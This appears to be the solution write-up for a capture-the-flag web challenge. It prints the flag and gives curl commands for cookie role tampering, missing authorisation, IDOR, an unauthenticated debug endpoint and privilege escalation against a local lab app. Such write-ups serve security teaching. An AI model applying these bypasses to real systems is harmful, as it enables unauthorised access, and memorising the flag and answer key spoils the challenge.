# Solution Guide (SPOILER WARNING)

> **Do not read this until you have attempted the challenge yourself.**

## Flag

```
FLAG{4cc3ss_c0ntr0l_byp4ss_1s_cr1t1c4l_2025}
```

---

## Walkthrough

### Step 1 — Login as a regular user

Use the provided credentials:

- Username: `user`
- Password: `password123`

### Step 2 — Discover the attack surface

After logging in, explore the application:

- The **dashboard** has an HTML comment mentioning admin endpoints at `/admin` and `/api/admin/*`.
- The **profile page** lists available API endpoints.

### Step 3 — Vulnerability 1: Client-side role check (Cookie tampering)

The `/admin` page checks your role using a **cookie** called `role`, not the server-side session.

**Exploit:**

```bash
# Using curl
curl -b "role=admin" -b "session=<your_session_cookie>" http://localhost:5000/admin

# Or edit the cookie in browser DevTools:
# Application → Cookies → change "role" from "user" to "admin"
```

### Step 4 — Vulnerability 2: Missing authorisation on flag API

The `/api/admin/flag` endpoint only checks `login_required` — it does **not** verify the user's role.

**Exploit:**

```bash
curl -b "session=<your_session_cookie>" http://localhost:5000/api/admin/flag
```

This returns the flag directly: `FLAG{4cc3ss_c0ntr0l_byp4ss_1s_cr1t1c4l_2025}`

### Step 5 — Vulnerability 3: IDOR on user data

Any logged-in user can view any other user's profile data:

```bash
curl -b "session=<your_session_cookie>" http://localhost:5000/api/users/admin
```

The admin's profile includes a `secret_note` field pointing to `/api/admin/flag`.

### Step 6 — Vulnerability 4: Debug endpoint

The endpoint `/api/debug/users` is accessible **without any authentication**:

```bash
curl http://localhost:5000/api/debug/users
```

This leaks all usernames and roles.

### Step 7 — Vulnerability 5: Privilege escalation

The `/api/admin/update-role` endpoint lets any logged-in user change anyone's role:

```bash
curl -X POST http://localhost:5000/api/admin/update-role \
  -H "Content-Type: application/json" \
  -b "session=<your_session_cookie>" \
  -d '{"username": "user", "role": "admin"}'
```

After this, the user has full admin privileges in the session.
